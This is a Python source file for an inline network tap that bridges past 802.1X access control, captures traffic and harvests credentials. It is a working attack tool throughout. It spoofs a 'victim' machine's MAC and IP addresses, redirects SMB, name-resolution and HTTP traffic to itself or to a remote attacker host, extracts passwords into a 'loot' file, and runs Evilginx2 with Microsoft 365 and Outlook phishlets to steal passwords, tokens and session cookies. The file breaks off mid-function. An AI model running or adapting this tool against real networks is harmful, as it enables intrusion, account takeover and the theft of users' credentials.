#!/usr/bin/env python3
"""
NAC Bridge Monitor - Transparent Inline Tap Edition
Completely transparent L2 bridge for 802.1X environments
No stealth mode - bridge always active for seamless operation
Run as root: sudo python3 nac-monitor.py
"""

import os
import sys
import json
import subprocess
import re
import time
import signal
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    'MGMT_INTERFACES': ['wlan0', 'wlan1', 'wlp', 'wifi'],
    'BRIDGE_NAME': 'br0',
    'BRIDGE_IP': '10.200.66.1',  # IP for MITM interception
    'PCAP_DIR': '/var/log/nac-captures',
    'PIDFILE': '/var/run/auto-nac-tcpdump.pid',
    'STATEFILE': '/var/run/auto-nac-state.conf',
    'LOGFILE': '/var/log/auto-nac-bridge.log',
    'LOOT_FILE': '/var/log/nac-captures/loot.json',
    'PCREDZ_PATH': '/opt/PCredz/pcredz-wrapper.sh',
    'EVILGINX_PATH': '/opt/evilginx2/evilginx',
    'EVILGINX_DB': '/var/log/nac-captures/evilginx.db',
    'EVILGINX_CONFIG': '/var/log/nac-captures/evilginx-config',
    'WEB_PORT': 8080,
    'TRANSPARENT_MODE': True,  # Bridge always active (802.1X compatible)
    'ANALYSIS_INTERVAL': 300,  # Seconds between automated loot scans
    'MITM_ENABLED': False,
    'REMOTE_ATTACKER_IP': None,
}

# Core protocols for interception (focused list)
INTERCEPT_PROTOCOLS = {
    'smb': [
        ('NetBIOS-NS', 137, ['tcp', 'udp']),
        ('NetBIOS-DGM', 138, ['udp']),
        ('NetBIOS-SSN', 139, ['tcp']),
        ('SMB', 445, ['tcp', 'udp']),
    ],
    'name_resolution': [
        ('LLMNR', 5355, ['udp']),
        ('mDNS', 5353, ['udp']),
    ],
    'http': [
        ('HTTP', 80, ['tcp']),
    ],
    'evilginx': [
        ('HTTP', 80, ['tcp']),
        ('HTTPS', 443, ['tcp']),
        ('DNS', 53, ['udp']),
    ],
}

# Microsoft phishlets for Evilginx2
MICROSOFT_PHISHLETS = {
    'o365': {
        'name': 'o365',
        'domains': 'login.microsoftonline.com',
        'description': 'Microsoft 365 / Outlook / Office'
    },
    'outlook': {
        'name': 'outlook',
        'domains': 'outlook.live.com',
        'description': 'Outlook.com (Personal)'
    }
}

capture_lock = threading.Lock()
shutdown_in_progress = False

# ============================================================================
# UTILITIES
# ============================================================================

def log(message, level='INFO'):
    """Thread-safe logging"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"[{timestamp}] [{level}] {message}"
    print(log_line)
    try:
        with open(CONFIG['LOGFILE'], 'a') as f:
            f.write(log_line + '\n')
    except Exception:
        pass

def run_cmd(cmd, check=False, timeout=None):
    """Run command and return result"""
    try:
        return subprocess.run(cmd, capture_output=True, text=True,
                              check=check, timeout=timeout)
    except Exception:
        return None

def is_mgmt_interface(iface):
    """Check if interface is management/wireless"""
    for mgmt in CONFIG['MGMT_INTERFACES']:
        if iface.startswith(mgmt):
            return True
    return (os.path.exists(f"/sys/class/net/{iface}/wireless") or
            os.path.exists(f"/sys/class/net/{iface}/phy80211"))

# ============================================================================
# LOOT ANALYZER
# ============================================================================

class LootAnalyzer:
    """Analyzes PCAP for credentials using PCredz"""

    def __init__(self):
        self.pcredz_path = CONFIG['PCREDZ_PATH']
        self.loot_items = []
        self.loot_file = CONFIG['LOOT_FILE']
        self.raw_output_file = CONFIG['LOOT_FILE'].replace('.json', '_raw.txt')
        self.analysis_lock = threading.Lock()
        self.raw_output = ""
        self.load_existing_loot()

    def analyze_pcap(self, pcap_file):
        """Run PCredz on PCAP file"""
        if not os.path.exists(self.pcredz_path):
            log("PCredz wrapper not found", 'WARNING')
            return {'success': False, 'error': 'PCredz not installed', 'new_items': 0}

        if not os.path.exists(pcap_file):
            log(f"PCAP file not found: {pcap_file}", 'ERROR')
            return {'success': False, 'error': 'PCAP file not found', 'new_items': 0}

        file_size = os.path.getsize(pcap_file) / 1024 / 1024
        log(f"Analyzing {os.path.basename(pcap_file)} ({file_size:.1f} MB) with PCredz...")

        try:
            result = subprocess.run(
                ['/bin/bash', self.pcredz_path, '-f', pcap_file],
                capture_output=True,
                text=True,
                timeout=300
            )

            # Save raw output
            with self.analysis_lock:
                self.raw_output = result.stdout
                self.save_raw_output()
            
            # Check if there's any output
            if result.stdout and result.stdout.strip():
                log(f"PCredz analysis complete - check Loot tab for results", 'SUCCESS')
                return {'success': True, 'output': result.stdout}
            else:
                log("No credentials found in this PCAP")
                return {'success': True, 'output': 'No credentials found'}

        except subprocess.TimeoutExpired:
            log("PCredz analysis timed out (>5min)", 'WARNING')
            return {'success': False, 'error': 'Analysis timed out', 'new_items': 0}
        except Exception as e:
            log(f"PCredz analysis failed: {e}", 'ERROR')
            return {'success': False, 'error': str(e), 'new_items': 0}

    def parse_pcredz_output(self, output, pcap_file):
        """Parse PCredz output for credentials"""
        loot = []
        timestamp = datetime.now().isoformat()

        # Compile regex patterns once for efficiency (reuse compiled patterns)
        if not hasattr(self, '_compiled_patterns'):
            self._compiled_patterns = [
                (re.compile(r'HTTP.*?(?:User|Username|Login):\s*(\S+).*?(?:Pass|Password):\s*(\S+)', re.IGNORECASE | re.DOTALL), 'HTTP'),
                (re.compile(r'FTP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'FTP'),
                (re.compile(r'SMTP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'SMTP'),
                (re.compile(r'IMAP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'IMAP'),
                (re.compile(r'POP3.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'POP3'),
                (re.compile(r'NTLM.*?(?:User|Username):\s*(\S+).*?(?:Hash|Password):\s*(\S+)', re.IGNORECASE | re.DOTALL), 'NTLM'),
                (re.compile(r'Kerberos.*?User:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'KERBEROS'),
                (re.compile(r'LDAP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'LDAP'),
            ]

        for pattern, proto in self._compiled_patterns:
            for match in pattern.finditer(output):
                username = match.group(1).strip()
                password = match.group(2).strip() if len(match.groups()) > 1 else 'N/A'

                if not self._is_duplicate(proto, username, password):
                    loot.append({
                        'id': len(self.loot_items) + len(loot) + 1,
                        'timestamp': timestamp,
                        'protocol': proto,
                        'username': username,
                        'password': password,
                        'source': os.path.basename(pcap_file),
                        'raw': match.group(0)[:200]
                    })

        return loot

    def _is_duplicate(self, proto, username, password):
        """Check if credential already captured - optimized with early exit"""
        for item in self.loot_items:
            if (item.get('protocol') == proto and
                item.get('username') == username and
                item.get('password') == password):
                return True
        return False

    def save_loot(self):
        """Save loot to JSON file"""
        try:
            with open(self.loot_file, 'w') as f:
                json.dump(self.loot_items, f, indent=2)
            os.chmod(self.loot_file, 0o600)
        except Exception as e:
            log(f"Failed to save loot: {e}", 'ERROR')
    
    def save_raw_output(self):
        """Save raw PCredz output to text file"""
        try:
            with open(self.raw_output_file, 'w') as f:
                f.write(self.raw_output)
            os.chmod(self.raw_output_file, 0o600)
            log(f"Saved raw PCredz output to {self.raw_output_file}")
        except Exception as e:
            log(f"Failed to save raw output: {e}", 'ERROR')

    def load_existing_loot(self):
        """Load existing loot from file"""
        try:
            if os.path.exists(self.loot_file):
                with open(self.loot_file, 'r') as f:
                    self.loot_items = json.load(f)
                log(f"Loaded {len(self.loot_items)} existing loot items")
        except Exception:
            self.loot_items = []
        
        # Load raw output if exists
        try:
            if os.path.exists(self.raw_output_file):
                with open(self.raw_output_file, 'r') as f:
                    self.raw_output = f.read()
        except Exception:
            self.raw_output = ""

    def get_loot_summary(self):
        """Get loot statistics - returns raw output"""
        return {
            'raw_output': self.raw_output,
            'has_output': bool(self.raw_output and self.raw_output.strip())
        }

    def clear_loot(self):
        """Clear all loot"""
        with self.analysis_lock:
            self.loot_items = []
            self.raw_output = ""
            try:
                with open(self.loot_file, 'w') as f:
                    json.dump([], f)
                with open(self.raw_output_file, 'w') as f:
                    f.write("")
            except Exception as e:
                log(f"Error clearing loot: {e}", 'ERROR')
        log("Loot cleared")

# ============================================================================
# MITM MANAGER
# ============================================================================

class MITMManager:
    """Manages MITM attacks with traffic interception"""

    def __init__(self):
        self.enabled = False
        self.victim_mac = None
        self.victim_ip = None
        self.gateway_mac = None
        self.bridge_ip = CONFIG['BRIDGE_IP']
        self.active_rules = []
        self.learning_mode = False

    def setup_bridge_ip(self, bridge_name):
        """Assign IP to bridge for local interception"""
        try:
            # Remove any existing IP
            run_cmd(['ip', 'addr', 'flush', 'dev', bridge_name])
            
            # Add our IP
            result = run_cmd(['ip', 'addr', 'add', f'{self.bridge_ip}/24', 'dev', bridge_name])
            if result and result.returncode == 0:
                log(f"Bridge IP assigned: {self.bridge_ip}", 'SUCCESS')
                
                # Enable IP forwarding
                run_cmd(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
                return True
            else:
                log("Failed to assign bridge IP", 'ERROR')
                return False
        except Exception as e:
            log(f"Bridge IP setup error: {e}", 'ERROR')
            return False

    def learn_victim(self, bridge_name, timeout=30):
        """Learn victim MAC and IP from bridge traffic"""
        log("Learning victim identity (30s timeout)...")
        self.learning_mode = True
        
        try:
            # Capture a few packets to identify victim
            result = run_cmd([
                'timeout', str(timeout),
                'tcpdump', '-i', bridge_name, '-nn', '-c', '20', '-e',
                'not arp and not stp and not ether proto 0x888e'
            ], timeout=timeout + 5)
            
            if result and result.stdout:
                # Parse to find most common source MAC (that's our victim)
                mac_pattern = re.compile(r'([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})')
                ip_pattern = re.compile(r'(\d+\.\d+\.\d+\.\d+)\.\d+ >')
                
                macs = {}
                ips = {}
                gateway_candidates = {}
                
                for line in result.stdout.split('\n'):
                    # Find source MAC (first MAC in line after timestamp)
                    mac_matches = mac_pattern.findall(line)
                    if len(mac_matches) >= 2:
                        src_mac = mac_matches[0]
                        dst_mac = mac_matches[1]
                        macs[src_mac] = macs.get(src_mac, 0) + 1
                        
                        # Gateway is most common destination MAC
                        if dst_mac != src_mac:
                            gateway_candidates[dst_mac] = gateway_candidates.get(dst_mac, 0) + 1
                    
                    # Find source IP
                    ip_match = ip_pattern.search(line)
                    if ip_match:
                        src_ip = ip_match.group(1)
                        # Skip bridge IP and link-local
                        if src_ip != self.bridge_ip and not src_ip.startswith('169.254'):
                            ips[src_ip] = ips.get(src_ip, 0) + 1
                
                # Victim is most common source MAC
                if macs:
                    self.victim_mac = max(macs, key=macs.get)
                    log(f"Victim MAC identified: {self.victim_mac}", 'SUCCESS')
                
                # Victim IP is most common source IP
                if ips:
                    self.victim_ip = max(ips, key=ips.get)
                    log(f"Victim IP identified: {self.victim_ip}", 'SUCCESS')
                
                # Gateway is most common destination MAC
                if gateway_candidates:
                    self.gateway_mac = max(gateway_candidates, key=gateway_candidates.get)
                    log(f"Gateway MAC identified: {self.gateway_mac}", 'SUCCESS')
                
                self.learning_mode = False
                return bool(self.victim_mac and self.victim_ip)
            
        except Exception as e:
            log(f"Victim learning failed: {e}", 'ERROR')
        
        self.learning_mode = False
        return False

    def setup_nat_rules(self, bridge_name, switch_iface):
        """Setup NAT to spoof victim MAC/IP on attacker traffic"""
        if not self.victim_mac or not self.victim_ip:
            log("Cannot setup NAT - victim not identified", 'ERROR')
            return False
        
        try:
            log("Setting up NAT rules for victim spoofing...")
            
            # MAC spoofing with ebtables (switch-side interface)
            run_cmd(['ebtables', '-t', 'nat', '-F', 'POSTROUTING'])
            result = run_cmd([
                'ebtables', '-t', 'nat', '-A', 'POSTROUTING',
                '-o', switch_iface, '-j', 'snat',
                '--to-src', self.victim_mac
            ])
            
            if result and result.returncode == 0:
                log(f"MAC spoofing active: {self.victim_mac}", 'SUCCESS')
            else:
                log("MAC spoofing setup failed", 'WARNING')
            
            # IP spoofing with iptables
            result = run_cmd([
                'iptables', '-t', 'nat', '-A', 'POSTROUTING',
                '-o', bridge_name, '-j', 'SNAT',
                '--to-source', self.victim_ip
            ])
            
            if result and result.returncode == 0:
                log(f"IP spoofing active: {self.victim_ip}", 'SUCCESS')
                return True
            else:
                log("IP spoofing setup failed", 'ERROR')
                return False
                
        except Exception as e:
            log(f"NAT setup error: {e}", 'ERROR')
            return False

    def add_intercept_rule(self, protocol_name, port, protocols, destination='local'):
        """Add iptables DNAT rule to intercept traffic"""
        bridge = CONFIG['BRIDGE_NAME']
        
        # Determine target IP
        if destination == 'local':
            target_ip = self.bridge_ip
        elif destination == 'remote':
            target_ip = CONFIG['REMOTE_ATTACKER_IP']
            if not target_ip:
                log("No remote attacker IP configured", 'ERROR')
                return False
        else:
            target_ip = destination
        
        success = True
        for proto in protocols:
            cmd = [
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-i', bridge, '-p', proto, '--dport', str(port),
                '-j', 'DNAT', '--to', f'{target_ip}:{port}'
            ]
            
            result = run_cmd(cmd)
            if not result or result.returncode != 0:
                log(f"Failed to add {proto.upper()}/{port} rule", 'ERROR')
                success = False
            else:
                log(f"Intercept rule added: {protocol_name} {proto.upper()}/{port} → {target_ip}")
        
        if success:
            self.active_rules.append({
                'protocol': protocol_name,
                'port': port,
                'destination': destination,
                'target_ip': target_ip
            })
        
        return success

    def remove_all_intercept_rules(self):
        """Remove all DNAT intercept rules"""
        if not self.active_rules:
            return
        
        log("Removing intercept rules...")
        bridge = CONFIG['BRIDGE_NAME']
        
        for rule in self.active_rules[:]:
            port = rule['port']
            target_ip = rule['target_ip']
            
            # Try both TCP and UDP
            for proto in ['tcp', 'udp']:
                run_cmd([
                    'iptables', '-t', 'nat', '-D', 'PREROUTING',
                    '-i', bridge, '-p', proto, '--dport', str(port),
                    '-j', 'DNAT', '--to', f'{target_ip}:{port}'
                ])
        
        self.active_rules = []
        log("All intercept rules removed")

    def setup_remote_routing(self, remote_ip):
        """Setup routing for remote attacker VM via WiFi"""
        if not remote_ip:
            return False
        
        try:
            log(f"Setting up routing to remote attacker: {remote_ip}")
            
            bridge = CONFIG['BRIDGE_NAME']
            
            # Enable forwarding between bridge and wlan0
            run_cmd(['iptables', '-A', 'FORWARD', '-i', bridge, '-o', 'wlan0', '-j', 'ACCEPT'])
            run_cmd(['iptables', '-A', 'FORWARD', '-i', 'wlan0', '-o', bridge, '-j', 'ACCEPT'])
            
            # SNAT for packets going to remote VM
            run_cmd([
                'iptables', '-t', 'nat', '-A', 'POSTROUTING',
                '-o', 'wlan0', '-d', remote_ip,
                '-j', 'SNAT', '--to-source', '172.31.250.1'
            ])
            
            CONFIG['REMOTE_ATTACKER_IP'] = remote_ip
            log(f"Remote routing configured to {remote_ip}", 'SUCCESS')
            return True
            
        except Exception as e:
            log(f"Remote routing setup failed: {e}", 'ERROR')
            return False

    def cleanup(self):
        """Clean up all MITM configuration"""
        log("Cleaning up MITM configuration...")
        
        # Remove intercept rules
        self.remove_all_intercept_rules()
        
        # Remove NAT rules
        bridge = CONFIG['BRIDGE_NAME']
        
        if self.victim_ip:
            run_cmd([
                'iptables', '-t', 'nat', '-D', 'POSTROUTING',
                '-o', bridge, '-j', 'SNAT',
                '--to-source', self.victim_ip
            ])
        
        if self.victim_mac:
            run_cmd(['ebtables', '-t', 'nat', '-F', 'POSTROUTING'])
        
        # Remove forwarding rules
        if CONFIG['REMOTE_ATTACKER_IP']:
            run_cmd(['iptables', '-D', 'FORWARD', '-i', bridge, '-o', 'wlan0', '-j', 'ACCEPT'])
            run_cmd(['iptables', '-D', 'FORWARD', '-i', 'wlan0', '-o', bridge, '-j', 'ACCEPT'])
        
        # Reset state
        self.enabled = False
        self.victim_mac = None
        self.victim_ip = None
        self.gateway_mac = None
        CONFIG['MITM_ENABLED'] = False
        CONFIG['REMOTE_ATTACKER_IP'] = None
        
        log("MITM cleanup complete", 'SUCCESS')

    def get_status(self):
        """Return MITM status"""
        return {
            'enabled': self.enabled,
            'learning': self.learning_mode,
            'bridge_ip': self.bridge_ip,
            'victim_mac': self.victim_mac,
            'victim_ip': self.victim_ip,
            'gateway_mac': self.gateway_mac,
            'remote_attacker_ip': CONFIG['REMOTE_ATTACKER_IP'],
            'active_rules': self.active_rules
        }

# ============================================================================
# EVILGINX2 MANAGER
# ============================================================================

class EvilginxManager:
    """Manages Evilginx2 for OAuth token and cookie capture"""

    def __init__(self):
        self.evilginx_path = CONFIG['EVILGINX_PATH']
        self.db_path = CONFIG['EVILGINX_DB']
        self.config_dir = CONFIG['EVILGINX_CONFIG']
        self.process = None
        self.running = False
        self.bridge_ip = CONFIG['BRIDGE_IP']
        self.phishlet = None
        self.lure_url = None
        self.sessions = []
        self.monitor_thread = None
        self.stop_monitoring = False

    def check_installation(self):
        """Check if Evilginx2 is installed"""
        return os.path.exists(self.evilginx_path)

    def setup_config(self, phishlet='o365', domain=None):
        """Setup Evilginx2 configuration"""
        try:
            os.makedirs(self.config_dir, exist_ok=True)
            
            # Create config file
            config_file = os.path.join(self.config_dir, 'config.yaml')
            
            if not domain:
                domain = f'{phishlet}.local'
            
            config_content = f"""# Evilginx2 Config - NAC Tap Integration
phishlets:
  - name: {phishlet}
    enabled: true
    hostname: {domain}
    
server:
  bind_ip: {self.bridge_ip}
  http_port: 80
  https_port: 443
  
redirect_url: https://www.microsoft.com
"""
            
            with open(config_file, 'w') as f:
                f.write(config_content)
            
            log(f"Evilginx config created: {config_file}")
            return True
            
        except Exception as e:
            log(f"Config setup failed: {e}", 'ERROR')
            return False

    def start(self, phishlet='o365', domain=None):
        """Start Evilginx2 process"""
        if self.running and self.process and self.process.poll() is None:
            log("Evilginx2 already running", 'WARNING')
            return True

        if not self.check_installation():
            log("Evilginx2 not found - please install first", 'ERROR')
            return False

        try:
            log(f"Starting Evilginx2 with {phishlet} phishlet...")
            
            if not domain:
                domain = f'{phishlet}.local'
            
            self.phishlet = phishlet
            
            # Start Evilginx2 in background
            # We'll use custom command sequence
            cmd_sequence = f"""
config domain {domain}
config ip {self.bridge_ip}
phishlets hostname {phishlet} {domain}
phishlets enable {phishlet}
lures create {phishlet}
lures get-url 0
"""
            
            # Create command file
            cmd_file = os.path.join(self.config_dir, 'startup.txt')
            with open(cmd_file, 'w') as f:
                f.write(cmd_sequence)
            
            # Start Evilginx2
            log_file = os.path.join(CONFIG['PCAP_DIR'], 'evilginx.log')
            
            self.process = subprocess.Popen(
                [self.evilginx_path, '-p', '/opt/evilginx2/phishlets', '-d', self.db_path],
                stdin=subprocess.PIPE,
                stdout=open(log_file, 'a'),
                stderr=subprocess.STDOUT,
                preexec_fn=os.setpgrp
            )
            
            # Send configuration commands
            time.sleep(2)
            if self.process.poll() is None:
                try:
                    self.process.stdin.write(cmd_sequence.encode())
                    self.process.stdin.flush()
                except:
                    pass
            
            time.sleep(3)
            
            # Verify it's running
            if self.process.poll() is None:
                self.running = True
                self.lure_url = f"http://{domain}"
                
                # Start session monitoring
                self.stop_monitoring = False
                self.monitor_thread = threading.Thread(target=self._monitor_sessions, daemon=True)
                self.monitor_thread.start()
                
                log(f"✓ Evilginx2 started (PID: {self.process.pid})", 'SUCCESS')
                log(f"✓ Phishlet: {phishlet}")
                log(f"✓ Lure URL: {self.lure_url}")
                return True
            else:
                log("Evilginx2 failed to start", 'ERROR')
                return False

        except Exception as e:
            log(f"Evilginx2 start failed: {e}", 'ERROR')
            return False

    def stop(self):
        """Stop Evilginx2"""
        log("Stopping Evilginx2...")
        self.stop_monitoring = True
        
        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=5)
        
        try:
            if self.process:
                # Send quit command
                try:
                    self.process.stdin.write(b'quit\n')
                    self.process.stdin.flush()
                    self.process.wait(timeout=5)
                except:
                    pass
                
                # Force kill if still running
                if self.process.poll() is None:
                    self.process.terminate()
                    try:
                        self.process.wait(timeout=5)
                    except:
                        self.process.kill()
                
                self.process = None
            
            self.running = False
            self.phishlet = None
            self.lure_url = None
            log("Evilginx2 stopped", 'SUCCESS')
            return True
            
        except Exception as e:
            log(f"Stop failed: {e}", 'ERROR')
            return False

    def _monitor_sessions(self):
        """Monitor Evilginx database for captured sessions"""
        while not self.stop_monitoring:
            try:
                if os.path.exists(self.db_path):
                    # Parse Evilginx database for sessions
                    # Database is JSON-based
                    try:
                        import sqlite3
                        conn = sqlite3.connect(self.db_path)
                        cursor = conn.cursor()
                        
                        # Get sessions
                        cursor.execute("SELECT id, phishlet, username, password, tokens, cookies, create_time FROM sessions WHERE captured=1")
                        rows = cursor.fetchall()
                        
                        new_sessions = []
                        for row in rows:
                            session = {
                                'id': row[0],
                                'phishlet': row[1],
                                'username': row[2],
                                'password': row[3],
                                'tokens': row[4],
                                'cookies': row[5],
                                'captured_at': row[6],
                                'timestamp': datetime.now().isoformat()
                            }
                            
                            # Check if new
                            if not any(s['id'] == session['id'] for s in self.sessions):
                                new_sessions.append(session)
                                log(f"🎣 New session captured! User: {session['username']}", 'SUCCESS')
                        
                        if new_sessions:
                            self.sessions.extend(new_sessions)
                            self._save_sessions()
                        
                        conn.close()
                    except Exception as e:
                        log(f"Session parsing error: {e}", 'ERROR')
                
                time.sleep(5)
                
            except Exception as e:
                log(f"Monitor error: {e}", 'ERROR')
                time.sleep(5)

    def _save_sessions(self):
        """Save captured sessions to file"""
        try:
            session_file = os.path.join(CONFIG['PCAP_DIR'], 'evilginx_sessions.json')
            with open(session_file, 'w') as f:
                json.dump(self.sessions, f, indent=2)
            os.chmod(session_file, 0o600)
            log(f"Sessions saved: {len(self.sessions)} total")
        except Exception as e:
            log(f"Failed to save sessions: {e}", 'ERROR')

    def load_sessions(self):
        """Load existing sessions"""
        try:
            session_file = os.path.join(CONFIG['PCAP_DIR'], 'evilginx_sessions.json')
            if os.path.exists(session_file):
                with open(session_file, 'r') as f:
                    self.sessions = json.load(f)
                log(f"Loaded {len(self.sessions)} existing sessions")
        except Exception:
            self.sessions = []

    def get_status(self):
        """Get Evilginx2 status"""
        return {
            'running': self.running,
            'installed': self.check_installation(),
            'install_path': self.evilginx_path if self.check_installation() else None,
            'phishlet': self.phishlet,
            'lure_url': self.lure_url,
            'bridge_ip': self.bridge_ip,
            'sessions_count': len(self.sessions),
            'sessions': self.sessions,
            'pid': self.process.pid if self.process and self.process.poll() is None else None
        }
    
    def install(self):
        """Install Evilginx2 using the install script"""
        try:
            log("Starting Evilginx2 installation...")
            
            # Find the install script
            script_locations = [
                '/opt/nac-tap/install-evilginx.sh',
                os.path.join(os.path.dirname(os.path.abspath(__file__)), 'install-evilginx.sh'),
                '/tmp/install-evilginx.sh'
            ]
            
            install_script = None
            for location in script_locations:
                if os.path.exists(location):
                    install_script = location
                    break
            
            if not install_script:
                log("Install script not found", 'ERROR')
                return {'success': False, 'error': 'Install script not found'}
            
            # Run installation script
            result = run_cmd(['bash', install_script], timeout=600)
            
            if result and result.returncode == 0:
                log("Evilginx2 installation completed successfully", 'SUCCESS')
                return {
                    'success': True,
                    'message': 'Evilginx2 installed successfully',
                    'path': self.evilginx_path
                }
            else:
                error_msg = result.stderr if result else "Unknown error"
                log(f"Installation failed: {error_msg}", 'ERROR')
                return {
                    'success': False,
                    'error': f'Installation failed: {error_msg}'
                }
                
        except Exception as e:
            log(f"Installation error: {e}", 'ERROR')
            return {
                'success': False,
                'error': str(e)
            }

    def clear_sessions(self):
        """Clear all captured sessions"""
        self.sessions = []
        self._save_sessions()
        log("Evilginx sessions cleared")

# ============================================================================
# BRIDGE MANAGER
# ============================================================================

class BridgeManager:
    """Manages transparent network bridge and packet capture"""

    def __init__(self):
        self.interfaces = []
        self.tcpdump_process = None
        self.pcap_file = None
        self.start_time = None
        self.loot_analyzer = LootAnalyzer()
        self.mitm_manager = MITMManager()
        self.evilginx_manager = EvilginxManager()
        self.evilginx_manager.load_sessions()
        self.bridge_initialized = False
        self.client_ip = None
        self.gateway_ip = None
        self.analysis_interval = CONFIG.get('ANALYSIS_INTERVAL', 300)
        self.stop_monitoring = False
        self.monitor_thread = None

    def detect_interfaces(self):
        """Detect ethernet interfaces (not wireless)"""
        log("Detecting ethernet interfaces...")
        candidates = []

        result = run_cmd(['ip', '-o', 'link', 'show'])
        if not result:
            return None

        for line in result.stdout.split('\n'):
            if not line or ':' not in line:
                continue

            iface = line.split(':')[1].strip()
            iface = iface.split('@')[0]

            # Skip virtual and management interfaces
            if (re.match(r'^(lo|br|veth|docker|virbr|vmnet|tun|tap|dummy)', iface) or
                    is_mgmt_interface(iface)):
                continue

            # Only ethernet interfaces
            if re.match(r'^(eth|enp|lan|end)[0-9]', iface) and 'link/ether' in line:
                candidates.append(iface)
                log(f"  Found: {iface}")

        if len(candidates) < 2:
            log(f"ERROR: Need 2 ethernet interfaces, found {len(candidates)}", 'ERROR')
            return None

        self.interfaces = candidates[:2]
        log(f"Selected: {self.interfaces[0]} (client-side) <-> {self.interfaces[1]} (switch-side)")
        return self.interfaces

    def setup_transparent_bridge(self):
        """Setup permanent transparent L2 bridge"""
        if self.bridge_initialized:
            log("Bridge already initialized")
            return True

        if not self.interfaces and not self.detect_interfaces():
            return False

        client_int, switch_int = self.interfaces
        bridge = CONFIG['BRIDGE_NAME']

        try:
            log("=== Setting Up Transparent Bridge ===")
            log(f"Client side:  {client_int}")
            log(f"Switch side:  {switch_int}")
            log("Mode: Transparent L2 (802.1X compatible)")

            # Cleanup if exists
            if run_cmd(['ip', 'link', 'show', bridge]):
                log("Removing existing bridge...")
                self._force_cleanup_bridge()
                time.sleep(2)

            # Disable NetworkManager
            log("Disabling NetworkManager...")
            for iface in [client_int, switch_int]:
                run_cmd(['nmcli', 'device', 'set', iface, 'managed', 'no'])

            time.sleep(1)

            # Flush any IP addresses (pure L2)
            log("Flushing IP addresses (L2 only mode)...")
            for iface in [client_int, switch_int]:
                run_cmd(['ip', 'addr', 'flush', 'dev', iface])

            # Disable hardware offloading
            log("Disabling hardware offloading...")
            for iface in [client_int, switch_int]:
                for opt in ['gro', 'gso', 'tso']:
                    run_cmd(['ethtool', '-K', iface, opt, 'off'])

            # Create bridge
            log(f"Creating bridge {bridge}...")
            result = run_cmd(['ip', 'link', 'add', 'name', bridge, 'type', 'bridge'], check=False)
            if result and result.returncode != 0:
                log(f"Bridge creation failed: {result.stderr}", 'ERROR')
                return False

            # Configure for transparency
            log("Configuring bridge for transparency...")
            run_cmd(['ip', 'link', 'set', bridge, 'type', 'bridge', 'stp_state', '0'])
            run_cmd(['ip', 'link', 'set', bridge, 'type', 'bridge', 'forward_delay', '0'])
            run_cmd(['ip', 'link', 'set', bridge, 'type', 'bridge', 'ageing_time', '30000'])

            # Add interfaces to bridge
            log(f"Adding {client_int} to bridge...")
            result = run_cmd(['ip', 'link', 'set', client_int, 'master', bridge])
            if result and result.returncode != 0:
                log(f"Failed to add {client_int}: {result.stderr}", 'ERROR')
                return False

            log(f"Adding {switch_int} to bridge...")
            result = run_cmd(['ip', 'link', 'set', switch_int, 'master', bridge])
            if result and result.returncode != 0:
                log(f"Failed to add {switch_int}: {result.stderr}", 'ERROR')
                return False

            # Bring UP interfaces
            log("Bringing UP interfaces...")
            for iface in [client_int, switch_int]:
                result = run_cmd(['ip', 'link', 'set', iface, 'up'])
                if result and result.returncode == 0:
                    log(f"  ✓ {iface}: UP")
                else:
                    log(f"  ✗ {iface}: FAILED", 'ERROR')
                    return False

            # Bring UP bridge
            log(f"Bringing UP bridge {bridge}...")
            result = run_cmd(['ip', 'link', 'set', bridge, 'up'])
            if result and result.returncode != 0:
                log(f"Bridge UP failed: {result.stderr}", 'ERROR')
                return False

            log("Waiting for bridge to stabilize (3s)...")
            time.sleep(3)

            # Verify
            log("Verifying bridge...")
            result = run_cmd(['ip', 'link', 'show', bridge])
            if not result or 'state UP' not in result.stdout:
                log("Bridge verification FAILED - not UP", 'ERROR')
                log(f"Bridge output: {result.stdout if result else 'None'}", 'ERROR')
                return False

            result = run_cmd(['bridge', 'link', 'show'])
            if not result or client_int not in result.stdout or switch_int not in result.stdout:
                log("Bridge verification FAILED - members missing", 'ERROR')
                return False

            log("✓ Bridge verified and operational", 'SUCCESS')
            log("✓ 802.1X traffic will pass through transparently")

            self.bridge_initialized = True
            self._save_state()
            log("=== Transparent Bridge Ready ===", 'SUCCESS')
            return True

        except Exception as e:
            log(f"Bridge setup failed: {e}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return False

    def start_capture(self):
        """Start packet capture on bridge"""
        if self.tcpdump_process and self.tcpdump_process.poll() is None:
            log("Capture already running", 'WARNING')
            return True

        try:
            log("=== Starting Packet Capture ===")

            # Ensure bridge is set up
            if not self.bridge_initialized:
                log("Bridge not initialized, setting up...")
                if not self.setup_transparent_bridge():
                    return False

            # Final verification
            result = run_cmd(['ip', 'link', 'show', CONFIG['BRIDGE_NAME']])
            if not result or 'state UP' not in result.stdout:
                log("ERROR: Bridge is not UP!", 'ERROR')
                return False

            # Create capture directory
            os.makedirs(CONFIG['PCAP_DIR'], exist_ok=True)

            # Generate filename
            timestamp = datetime.now().strftime('%Y%m%dT%H%M%SZ')
            self.pcap_file = os.path.join(CONFIG['PCAP_DIR'], f'capture-{timestamp}.pcap')

            log(f"Starting tcpdump on {CONFIG['BRIDGE_NAME']}...")
            log(f"Output: {self.pcap_file}")

            # Start tcpdump
            self.tcpdump_process = subprocess.Popen(
                ['tcpdump', '-i', CONFIG['BRIDGE_NAME'], '-s', '0', '-U',
                 '-w', self.pcap_file, 'not arp and not stp'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
